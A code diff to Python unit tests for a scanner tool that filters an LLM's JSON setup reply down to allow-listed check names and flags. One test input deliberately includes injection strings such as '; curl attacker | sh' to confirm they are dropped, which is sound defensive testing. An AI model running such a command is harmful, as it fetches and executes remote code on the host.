@@ -14,9 +14,9 @@ KNOWN = {"sqli", "xss", "os", "ssti", "jwt", "graphql", "privesc"}
 
 
 def test_valid_response_reflected():
-    text = '{"checks": ["sqli", "jwt"], "depth": 3, "flags": ["--dom-xss"], "reason": "API"}'
+    text = '{"checks": ["sqli", "jwt"], "depth": 3, "flags": ["--headless"], "reason": "API"}'
     out = _parse_setup_llm(text, KNOWN)
-    assert out == {"checks": ["sqli", "jwt"], "depth": 3, "flags": ["--dom-xss"], "reason": "API"}
+    assert out == {"checks": ["sqli", "jwt"], "depth": 3, "flags": ["--headless"], "reason": "API"}
 
 
 def test_unknown_checks_filtered_but_valid_kept():
@@ -48,8 +48,8 @@ def test_empty_and_non_dict_return_none():
 
 
 def test_flags_must_be_string_list():
-    out = _parse_setup_llm('{"checks": ["os"], "flags": [1, "--dom-xss", null]}', KNOWN)
-    assert out["flags"] == ["--dom-xss"]         # 非文字列を除去し許可リスト flag のみ残す
+    out = _parse_setup_llm('{"checks": ["os"], "flags": [1, "--headless", null]}', KNOWN)
+    assert out["flags"] == ["--headless"]        # 非文字列を除去し許可リスト flag のみ残す
 
 
 def test_bool_depth_rejected():
@@ -64,11 +64,12 @@ def test_flags_allowlist_only_safe_toggles():
     out = _parse_setup_llm(
         '{"checks": ["os"], "flags": ["; curl attacker | sh", "--dom-xss", '
         '"--header-refresh-cmd=id", "--llm=claude", "--no-headless", "--fast", '
-        '"--all-checks", "--spa-crawl"]}',
+        '"--all-checks", "--ctf", "--spa-crawl", "--headless", "--no-monitor"]}',
         KNOWN,
     )
-    # 許可リスト外（注入/値付き/scan非対応 --no-headless/depth食い違い --fast/checks上書き --all-checks）は全落とし
-    assert out["flags"] == ["--dom-xss", "--spa-crawl"]
+    # 要約と食い違う flag（注入/値付き/scan非対応/checks・breadth 変更: dom-xss/spa-crawl/all-checks/ctf/fast）は全落とし、
+    # 表示・narrow 中立の許可リスト flag のみ残す
+    assert out["flags"] == ["--headless", "--no-monitor"]
 
 
 def test_call_llm_uses_provided_system(monkeypatch):
